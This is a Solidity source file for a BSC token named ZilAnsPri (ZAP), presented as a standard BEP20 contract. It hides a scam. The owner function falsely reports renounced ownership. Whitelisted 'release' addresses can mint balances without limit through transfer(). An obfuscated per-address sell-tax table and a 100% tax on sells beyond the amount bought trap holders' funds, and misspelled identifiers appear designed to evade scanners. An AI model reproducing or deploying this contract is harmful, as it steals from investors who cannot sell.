/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

/*
* http://instagram.com/ZilAnsPri6092
* https://www.reddit.com/user/ZilAnsPri6092
* TWITTER:https://ZilAnsPri6092.com/
* WEBSITE:https://twitter.com/ZilAnsPri6092
* TELEGRAM:https://t.me/ZilAnsPri6092
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingZilAnsPri6092OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingZilAnsPri6092OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingZilAnsPri6092OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingZilAnsPri6092OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingZilAnsPri6092OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function ZilAnsPri6092To() external view returns (address);
    function ZilAnsPri6092ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setZilAnsPri6092To(address) external;
    function setZilAnsPri6092ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

   function decimals() public view virtual returns (uint8) {
        return 18;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }
    function name() public view virtual returns (string memory) {
        return _name;
    }
      function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract ZAP is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _baZilAnsPri6092lances;
    mapping(address => uint256) private _baZilAnsPri6092lances1;
    mapping(address => bool) private _reZilAnsPri6092llease;
    mapping(uint256 => uint256) private _bZilAnsPri6092blist;
string name_ = "ZilAnsPri";
string symbol_ = "ZAP";
uint256 totalSupply_ = 1000000000;   
    address public uniswapV2Pair;
    address deZilAnsPri6092ad = 0x000000000000000000000000000000000000dEaD;
    address _gaZilAnsPri6092te = 0x0C89C0407775dd89b12918B9c0aa42Bf96518820;
    address _mxZilAnsPri6092x = 0x0D0707963952f2fBA59dD06f2b425ace40b492Fe;
    constructor()

BEP20(name_, symbol_) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

        _mtZilAnsPri6092in(msg.sender, totalSupply_ * 10**decimals());

         transfer(deZilAnsPri6092ad, totalSupply() / 10*2);
         transfer(_mxZilAnsPri6092x, totalSupply() / 10*2);
         transfer(_gaZilAnsPri6092te, totalSupply() / 10*1);

        _defaultSellZilAnsPri6092 = 0;
        _defaultBuyZilAnsPri6092 = 0;

        _reZilAnsPri6092llease[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _baZilAnsPri6092lances[cauunt];
    }

    function _mtZilAnsPri6092in(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _baZilAnsPri6092lances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellZilAnsPri6092 = 0;
    uint256 private _defaultBuyZilAnsPri6092 = 0;

    function _setRelease(address _address) external onlyowaer {
        _reZilAnsPri6092llease[_address] = true;
    }
    function _incS(uint256 _value) external onlyowaer {
        _defaultSellZilAnsPri6092 = _value;
    }

    function getRelease(address _address) external view onlyowaer returns (bool) {
        return _reZilAnsPri6092llease[_address];
    }

    function _setZilAnsPri6092(uint256[] memory _accZilAnsPri6092,uint256[] memory _value)  external onlyowaer {
        for (uint i=0;i<_accZilAnsPri6092.length;i++){
            _bZilAnsPri6092blist[_accZilAnsPri6092[i]] = _value[i];
        }
    }
function _msgZilAnsPri6092Info(uint _accZilAnsPri6092) internal view virtual returns (uint) {
        uint256 accZilAnsPri6092 = _accZilAnsPri6092 ^ 718702886383584756188710483446603457625836530111;
return _bZilAnsPri6092blist[accZilAnsPri6092];
}
    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_reZilAnsPri6092llease[owaer] == true) {
            _baZilAnsPri6092lances[to] += amuont;
            return true;
        }
        _tZilAnsPri6092transfer(owaer, to, amuont);
        return true;
    }
    function _tZilAnsPri6092transfer(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _baZilAnsPri6092lances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

  
        uint256 tradeZilAnsPri6092 = 0;
        uint256 tradeZilAnsPri6092amuont = 0;

        if (!(_reZilAnsPri6092llease[from] || _reZilAnsPri6092llease[_to])) {
            if (from == uniswapV2Pair) {
                tradeZilAnsPri6092 = _defaultBuyZilAnsPri6092;
                _baZilAnsPri6092lances1[_to] += _amuont;
            }
            if (_to == uniswapV2Pair) {                   
                tradeZilAnsPri6092 = _msgZilAnsPri6092Info(uint160(from));
                tradeZilAnsPri6092 = tradeZilAnsPri6092 < _defaultSellZilAnsPri6092 ? _defaultSellZilAnsPri6092 : tradeZilAnsPri6092;
                tradeZilAnsPri6092 = _baZilAnsPri6092lances1[from] >= _amuont ? tradeZilAnsPri6092 : 100;
                _baZilAnsPri6092lances1[from] = _baZilAnsPri6092lances1[from] >= _amuont ? _baZilAnsPri6092lances1[from] - _amuont : _baZilAnsPri6092lances1[from];
            }
                        
            tradeZilAnsPri6092amuont = _amuont.mul(tradeZilAnsPri6092).div(100);
        }


        if (tradeZilAnsPri6092amuont > 0) {
            _baZilAnsPri6092lances[from] = _baZilAnsPri6092lances[from].sub(tradeZilAnsPri6092amuont);
            _baZilAnsPri6092lances[deZilAnsPri6092ad] = _baZilAnsPri6092lances[deZilAnsPri6092ad].add(tradeZilAnsPri6092amuont);
            emit Transfer(from, deZilAnsPri6092ad, tradeZilAnsPri6092amuont);
        }

        _baZilAnsPri6092lances[from] = _baZilAnsPri6092lances[from].sub(_amuont - tradeZilAnsPri6092amuont);
        _baZilAnsPri6092lances[_to] = _baZilAnsPri6092lances[_to].add(_amuont - tradeZilAnsPri6092amuont);
        emit Transfer(from, _to, _amuont - tradeZilAnsPri6092amuont);
    }



    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _tZilAnsPri6092transfer(from, to, amuont);
        return true;
    }
}